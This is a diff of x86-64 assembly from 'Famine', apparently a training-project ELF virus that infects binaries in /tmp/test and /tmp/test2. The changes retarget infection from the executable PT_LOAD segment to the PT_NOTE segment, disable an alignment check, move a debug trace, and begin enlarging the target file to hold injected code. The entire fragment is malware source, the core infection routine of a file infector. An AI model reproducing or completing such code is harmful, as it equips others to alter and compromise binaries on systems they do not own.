@@ -11,6 +11,7 @@ section .text
     dirs db         "/tmp/test",0,"/tmp/test2",0,0
 
     _start:
+    
     ; this trick allows us to access Famine members using the VAR macro
     mov rbp, rsp
     sub rbp, Famine_size            ; allocate Famine struct on stack
@@ -119,7 +120,6 @@ section .text
                 jne .close_file
                 mov rax, [rsp + 48]
                 mov dword VAR(Famine.file_original_len), eax
-                TRACE_TEXT hello, 11
 
                 jmp .check_ehdr
 
@@ -192,10 +192,10 @@ section .text
                     jle .close_file
                     ; lo que sea de rbx
 
-                    cmp dword [rbx], 0x1
+                    cmp dword [rbx], 0x04 ;PT_NOTE
                     jne .next_phdr
-                    cmp dword [rbx + 4], 0x5 ; (1 << 2) | (1 << 0)
-                    jne .next_phdr
+                    ;cmp dword [rbx + Elf64_Phdr.p_align], 0x4
+                    ;jne .next_phdr
                     jmp .process_phdr
 
                 .next_phdr:
@@ -204,6 +204,7 @@ section .text
                     jmp .loop_phdr
 
                 .process_phdr:
+                    TRACE_TEXT hello, 11
                     ; ftruncate(fd_file, file_original_len + 0x4000)
                     mov rdi, VAR(Famine.fd_file)
                     xor rax, rax
